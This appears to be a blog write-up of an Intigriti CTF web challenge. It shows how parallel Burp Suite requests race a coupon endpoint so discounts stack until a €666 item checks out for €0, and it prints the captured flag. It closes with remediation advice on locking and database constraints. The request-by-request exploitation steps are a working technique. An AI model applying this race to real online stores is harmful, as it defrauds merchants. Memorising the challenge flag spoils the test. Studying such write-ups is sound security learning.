---
title: "Halloween Store — Race Condition in Coupon Logic | Intigriti CTF 🎃"
published: 2026-10-22
description: "A technical walkthrough of the Intigriti October 2026 CTF challenge, demonstrating how a concurrency race condition in promotional coupon validation allowed bypassing discount limits to purchase a €666 item with €0."
image: "/assets/images/halloween-intigriti/cover.gif"
category: "Write-ups"
tags: ["intigriti", "web-security", "ctf", "write-up", "race-condition", "business-logic", "burp-suite"]
draft: false
---

Halloween Store — Race Condition in Coupon Logic
================================================

## 1. Executive Summary

During the **Intigriti October 2026 CTF**, the **Halloween Store** challenge featured an e-commerce storefront offering a premium item priced well beyond the player's initial store credit. The application enforced business logic to prevent promotional discount codes from being applied more than once when submitted sequentially.

However, testing the coupon endpoint concurrently using **Burp Suite Repeater's Send group in parallel** feature revealed behavior consistent with a concurrency-related **Time-of-Check to Time-of-Use (TOCTOU)** race condition. Multiple concurrent requests were accepted before coupon usage counters were updated, allowing promotional discounts to accumulate repeatedly. This drove the payable total to **€0.00**, enabling a zero-cost checkout that revealed the challenge flag.

### Target & Assessment Scope

| Parameter | Value |
|---|---|
| **Target URL** | `https://challenge-1026.challenges.intigriti.io/challenge` |
| **Target Product** | The Midnight Collection (`id: midnight-vault`) |
| **Product Price** | `66600` cents (€666.00) |
| **Initial Credit** | `6600` cents (€66.00) |
| **Vulnerability Class** | Concurrency / Race Condition (CWE-367: TOCTOU) |
| **Flag** | `INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}` |

---

## 2. Reconnaissance and API Mapping

The challenge instance was hosted at:

```text
https://challenge-1026.challenges.intigriti.io/challenge
```

Accessing the application revealed an e-commerce storefront. Two constraints defined the core objective:

1. **Assigned Store Credit:** The authenticated user session started with an initial balance of **€66.00** (`6600` cents).
2. **Target Product:** The premium catalog item, **The Midnight Collection**, was listed at **€666.00** (`66600` cents), with only a single unit available in inventory.

Purchasing the item required overcoming a **€600.00** deficit.

### API Architecture Mapping

Reviewing client-side JavaScript (`/static/js/app.js`) and observing network traffic mapped the REST API endpoints handling cart management, promotions, and checkout:

| Method | Endpoint | Function |
|---|---|---|
| `GET` | `/api/session` | Retrieves active session state and store credit balance. |
| `GET` | `/api/products` | Lists the product catalog, availability, and prices. |
| `GET` | `/api/cart` | Inspects cart items, applied promotions, and totals. |
| `POST` | `/api/cart/items` | Adds a product ID and quantity to the active cart. |
| `POST` | `/api/cart/coupon` | Applies a promotional discount code to the cart. |
| `POST` | `/api/cart/coupon/remove` | Removes an applied promotional code from the cart. |
| `POST` | `/api/newsletter` | Subscribes an email address and returns a promotional code. |
| `POST` | `/api/checkout` | Finalizes the purchase and processes order payment. |

> [!NOTE]
> All monetary values across the API are represented as integers in **cents** (e.g., `66600` represents €666.00). Working with integer cents avoids floating-point precision errors during currency calculations.

Adding `midnight-vault` to the cart via `POST /api/cart/items` established the baseline cart state:

- **Subtotal:** `66600` cents (€666.00)
- **Discount:** `0` cents (€0.00)
- **Total:** `66600` cents (€666.00)
- **Credit:** `6600` cents (€66.00)
- **`canCheckout`:** `false`

---

## 3. Sequential Coupon Testing

The application provided two promotional discount codes:

1. **`NIGHT20`:** Advertised on the storefront banner, offering a **20% discount**.
2. **`NEWS30`:** Obtained by submitting an email to `POST /api/newsletter`, offering a **30% discount**.

### Applying the First Coupon (`NIGHT20`)

Submitting `NIGHT20` via Burp Suite Repeater evaluated how the server calculated discounts:

```http
POST /api/cart/coupon HTTP/2
Host: challenge-1026.challenges.intigriti.io
Cookie: session=<REDACTED>
Content-Type: application/json

{"code":"NIGHT20"}
```

The server accepted the code and responded with `HTTP/2 200 OK`:

```json
{
  "ok": true,
  "message": "20% promotion applied.",
  "cart": {
    "items": [
      {
        "id": "midnight-vault",
        "name": "The Midnight Collection",
        "subtitle": "One box. Made only once.",
        "price": 66600,
        "quantity": 1,
        "lineTotal": 66600
      }
    ],
    "itemCount": 1,
    "subtotal": 66600,
    "discount": 13320,
    "total": 53280,
    "credit": 6600,
    "canCheckout": false,
    "promotions": [
      {
        "code": "NIGHT20",
        "percent": 20,
        "amount": 13320,
        "count": 1
      }
    ]
  }
}
```

The server calculated the discount against the item subtotal:

$$
66{,}600 \times 0.20 = 13{,}320\text{ cents}
$$

$$
66{,}600 - 13{,}320 = 53{,}280\text{ cents}
$$

Subtracting the discount of 13,320 cents (€133.20) from the 66,600 cents (€666.00) subtotal yielded a payable total of 53,280 cents (€532.80). Available credit remained at 6,600 cents (€66.00).

![Burp Suite Repeater displaying the NIGHT20 coupon request and response](/assets/images/halloween-intigriti/01-night20-applied.png)
*Figure 1: Applying NIGHT20 reduces the total to €532.80, with `count: 1` and `canCheckout: false`.*

### Sequential Multi-Coupon Application

Applying the newsletter coupon (`NEWS30`) sequentially to the same cart was also accepted, calculating each discount relative to the original subtotal:

- **`NIGHT20` (20%):** $66{,}600 \times 0.20 = 13{,}320\text{ cents}$ (€133.20)
- **`NEWS30` (30%):** $66{,}600 \times 0.30 = 19{,}980\text{ cents}$ (€199.80)
- **Combined Discount:** $13{,}320 + 19{,}980 = 33{,}300\text{ cents}$ (€333.00)
- **Remaining Balance:** $66{,}600 - 33{,}300 = 33{,}300\text{ cents}$ (€333.00)

| Cart Attribute | Initial State | After `NIGHT20` | After `NIGHT20` + `NEWS30` |
|---|---:|---:|---:|
| **Subtotal** | €666.00 | €666.00 | €666.00 |
| **`NIGHT20` Discount** | €0.00 | €133.20 | €133.20 |
| **`NEWS30` Discount** | €0.00 | €0.00 | €199.80 |
| **Total Discount** | €0.00 | €133.20 | €333.00 |
| **Final Payable Total** | €666.00 | €532.80 | €333.00 |
| **Available Credit** | €66.00 | €66.00 | €66.00 |
| **`canCheckout`** | `false` | `false` | `false` |

Even with both legitimate promotional codes combined, the net payable amount was **€333.00**, which still exceeded the €66.00 credit balance by €267.00.

### Sequential Replay Failure

Each promotion object returned by the server tracked an explicit usage counter:

```json
"promotions": [
  { "code": "NIGHT20", "percent": 20, "amount": 13320, "count": 1 },
  { "code": "NEWS30", "percent": 30, "amount": 19980, "count": 1 }
]
```

To test if a promotional code could simply be reused, a duplicate request for `NEWS30` was submitted sequentially:

```http
POST /api/cart/coupon HTTP/2
Host: challenge-1026.challenges.intigriti.io
Cookie: session=<REDACTED>
Content-Type: application/json

{"code":"NEWS30"}
```

The server strictly rejected the duplicate submission with `HTTP/2 409 Conflict`:

```http
HTTP/2 409 Conflict
Date: Thu, 22 Oct 2026 19:03:50 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 81
Server: istio-envoy
Cache-Control: no-store
X-Envoy-Upstream-Service-Time: 9

{"ok":false,"error":"coupon_already_applied","message":"Coupon already applied."}
```

This confirmed that the application had functional server-side logic to reject duplicate coupons when processed sequentially. Once a code was registered in the cart session, any subsequent sequential request was halted with a `409 Conflict` status.

---

## 4. Exploiting the Race Condition

Because sequential reapplication was blocked by the `409 Conflict` check, testing shifted to assessing how the application handled concurrent submissions.

### Sequential vs. Parallel Execution Contrast

Testing the coupon endpoint under both serial and concurrent conditions revealed distinct behavior:

- **Sequential Execution:** The application evaluates requests serially. The initial coupon submission succeeds with `200 OK` (`count: 1`). Any subsequent sequential submission of the same code is evaluated against the updated cart state and explicitly rejected with `HTTP/2 409 Conflict` (`coupon_already_applied`).
- **Parallel Execution:** When duplicate or complementary coupon requests are submitted concurrently using Burp Suite Repeater's parallel group feature, multiple requests succeed with `HTTP/2 200 OK`. Rather than rejecting subsequent applications with `409 Conflict`, the server increments the coupon counters past their normal limits.

The observed behavior is consistent with a race condition in coupon validation or cart-state updates. Sequential duplicate submissions were rejected, whereas concurrent submissions resulted in duplicate coupon applications. The HTTP evidence demonstrates inconsistent behavior between sequential and concurrent handling, but does not establish the exact internal execution sequence or backend scheduling mechanism.

Requests were organized into a tab group and transmitted using **Burp Suite Repeater's Send group in parallel** feature.

### Parallel Request Burst and Initial Bypass

Transmitting the parallel group produced immediate race condition wins. As multiple coupon redemption requests resolved concurrently, both promotional codes were applied multiple times within the active cart:

```json
{
  "message": "30% promotion applied.",
  "cart": {
    "items": [
      {
        "id": "midnight-vault",
        "name": "The Midnight Collection",
        "subtitle": "One box. Made only once.",
        "description": "Our numbered Halloween archive: rare fruit jellies, black cocoa truffles and hand-wrapped midnight caramels in a keepsake chest.",
        "price": 66600,
        "weight": "2.4 kg",
        "category": "Gift boxes",
        "image": 5,
        "badge": "Only one available",
        "quantity": 1,
        "lineTotal": 66600
      }
    ],
    "itemCount": 1,
    "subtotal": 66600,
    "discount": 66600,
    "total": 0,
    "credit": 6600,
    "canCheckout": true,
    "promotions": [
      {
        "code": "NEWS30",
        "percent": 30,
        "amount": 59940,
        "count": 3
      },
      {
        "code": "NIGHT20",
        "percent": 20,
        "amount": 26640,
        "count": 2
      }
    ]
  }
}
```

![Burp Suite Repeater parallel request burst showing both coupons multi-applied and total zeroed out](/assets/images/halloween-intigriti/02-repeater-parallel-race.png)
*Figure 2: Burp Suite Repeater tab group sending parallel requests; the server response confirms both `NEWS30` (count: 3) and `NIGHT20` (count: 2) successfully applied, reducing the cart total to 0.*

The response demonstrates the race condition in action:
- `NEWS30` accumulated 3 applications: $3 \times 19{,}980 = 59{,}940\text{ cents}$ (€599.40).
- `NIGHT20` accumulated 2 applications: $2 \times 13{,}320 = 26{,}640\text{ cents}$ (€266.40).
- Nominal combined discount: $59{,}940 + 26{,}640 = 86{,}580\text{ cents}$ (€865.80).
- The server clamped the effective discount to the subtotal of `66600` cents (€666.00), reducing `total` to `0` and flipping `canCheckout` to `true`.

### Final Cart State Inspection

Inspecting the cart via `GET /api/cart` after completing the full batch of parallel requests confirmed that both promotion counters had continued to increment across the parallel burst:

```http
GET /api/cart HTTP/2
Host: challenge-1026.challenges.intigriti.io
Cookie: session=<REDACTED>
```

**Response:**

```json
{
  "ok": true,
  "cart": {
    "items": [
      {
        "id": "midnight-vault",
        "name": "The Midnight Collection",
        "price": 66600,
        "quantity": 1,
        "lineTotal": 66600
      }
    ],
    "itemCount": 1,
    "subtotal": 66600,
    "discount": 66600,
    "total": 0,
    "credit": 6600,
    "canCheckout": true,
    "promotions": [
      {
        "code": "NEWS30",
        "percent": 30,
        "amount": 159840,
        "count": 8
      },
      {
        "code": "NIGHT20",
        "percent": 20,
        "amount": 106560,
        "count": 8
      }
    ]
  }
}
```

![Burp Suite Repeater showing cart total zeroed out and canCheckout set to true](/assets/images/halloween-intigriti/03-cart-total-zero.png)
*Figure 3: Inspection of /api/cart showing both coupons applied 8 times each, capping the discount at €666.00 and enabling checkout.*

### Arithmetic Verification of the Exploit State

1. **`NEWS30` Accumulated Discount (8 redemptions):**
   $$8 \times 19{,}980 = 159{,}840\text{ cents}$$
   Nominal equivalent: €1,598.40.

2. **`NIGHT20` Accumulated Discount (8 redemptions):**
   $$8 \times 13{,}320 = 106{,}560\text{ cents}$$
   Nominal equivalent: €1,065.60.

3. **Combined Theoretical Discount:**
   $$159{,}840 + 106{,}560 = 266{,}400\text{ cents}$$
   Nominal equivalent: €2,664.00.

4. **Discount Capping Enforcement:**
   The backend logic prevented negative totals by clamping the discount to the original subtotal:
   $$\text{discount} = \min(266{,}400, 66{,}600) = 66{,}600\text{ cents}$$
   Effective discount: €666.00.

5. **Final Payable Amount:**
   $$66{,}600 - 66{,}600 = 0\text{ cents}$$
   Final total: €0.00.

Because the net payable amount was reduced to **€0.00**, which was well within the **€66.00** credit balance, the server set `"canCheckout": true`.

---

## 5. Checkout and Flag Capture

With `"canCheckout": true` active on the cart session, the purchase was completed by submitting a request to the checkout endpoint:

```http
POST /api/checkout HTTP/2
Host: challenge-1026.challenges.intigriti.io
Cookie: session=<REDACTED>
Content-Type: application/json

{}
```

The server confirmed the order with `HTTP/2 200 OK`:

```json
{
  "ok": true,
  "receipt": {
    "orderId": "BLE-5A4FC66A71",
    "paid": 0,
    "credit": 6600,
    "message": "Your order is confirmed and being prepared.",
    "flag": "INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}"
  }
}
```

The receipt confirmed:
- **Order ID:** `BLE-5A4FC66A71`
- **Paid with credit:** `0` (€0.00)
- **Remaining credit:** `6600` (€66.00)

Navigating back to the web application rendered the order confirmation modal containing the challenge flag:

![Order confirmation modal displaying the captured flag](/assets/images/halloween-intigriti/04-checkout-flag.png)
*Figure 4: The web application confirmation modal displaying Order BLE-5A4FC66A71, €0.00 paid, and the captured flag.*

**Flag:**

```text
INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}
```

---

## 6. Root Cause Analysis and Remediation

### Observed Behavior vs. Inferred Root Cause

- **Observed Behavior:** When requests were sent sequentially, duplicate coupon applications were consistently rejected with `HTTP/2 409 Conflict`. When requests were sent concurrently via Burp Suite Repeater's parallel group feature, multiple requests succeeded, incrementing coupon counters and accumulating discounts beyond the intended limits.
- **Inferred Cause:** The observed behavior is consistent with a **Time-of-Check to Time-of-Use (TOCTOU)** race condition. When concurrent requests arrive in close proximity, multiple execution contexts can validate that the coupon has not yet been applied before any of them commits the updated state.

### Remediation Strategies

The precise implementation of remediation depends on the application's underlying architecture, database engine, and state management design. The following defense-in-depth principles address the root issue:

#### 1. Atomic Validation and Application

Coupon verification and cart state updates must occur as a single, atomic operation. The application should not validate eligibility in one step and update the cart state in a separate, uncoordinated step.

#### 2. Database Concurrency Control and Transactions

In applications backed by a relational database, cart modifications should execute within transactions configured with appropriate concurrency controls:

- **Pessimistic Locking:** Acquire an exclusive row lock on the cart record during coupon evaluation and update (e.g., using `SELECT ... FOR UPDATE` in SQL) to serialize concurrent modifications for that cart.
- **Optimistic Locking:** Utilize version numbers or timestamps to detect and abort conflicting concurrent modifications if the record changed between reading and writing.

```sql
-- Conceptual example: serializing cart modifications with row-level locking
BEGIN TRANSACTION;

SELECT * FROM carts 
WHERE id = :cart_id 
FOR UPDATE;

-- Validate business rules (e.g., coupon not already applied)
-- If valid, record coupon and update totals
UPDATE carts 
SET discount = :discount, total = :total 
WHERE id = :cart_id;

COMMIT;
```

#### 3. Database Constraints for Business Rules

Where supported by the data model, business constraints should be enforced at the schema level. For example, storing applied promotions in a dedicated relationship table with a unique constraint on `(cart_id, coupon_code)` guarantees that the database engine will reject duplicate applications regardless of application-level timing:

```sql
CREATE TABLE cart_coupons (
    cart_id UUID REFERENCES carts(id),
    coupon_code VARCHAR(32),
    applied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (cart_id, coupon_code)
);
```

Under this model, concurrent attempts to insert the same coupon code will trigger a unique constraint violation, preventing duplicate redemptions.

#### 4. Server-Side Recalculation at Checkout

Applications should never rely solely on pre-computed cart totals stored in client-accessible sessions. During the checkout transaction, the server should independently recalculate all line items, re-validate promotion eligibility, and verify that the final payable total matches expected business rules before issuing an order receipt.

---

## 7. Key Takeaways

| Aspect | Sequential Behavior | Concurrent (Race Condition) Behavior |
|---|---|---|
| **Duplicate Request Handling** | Rejected with `409 Conflict` (`coupon_already_applied`) | Accepted with `200 OK` (bypasses duplicate check) |
| **`NIGHT20` Count** | 1 (capped) | 8 (multi-applied) |
| **`NEWS30` Count** | 1 (capped) | 8 (multi-applied) |
| **Total Discount** | €333.00 (50% max) | €666.00 (capped at subtotal) |
| **Final Payable** | €333.00 | **€0.00** |
| **Checkout Status** | Ineligible (`canCheckout: false`) | **Eligible (`canCheckout: true`)** |
| **Result** | Blocked by credit deficit | **Successful checkout, Flag retrieved** |
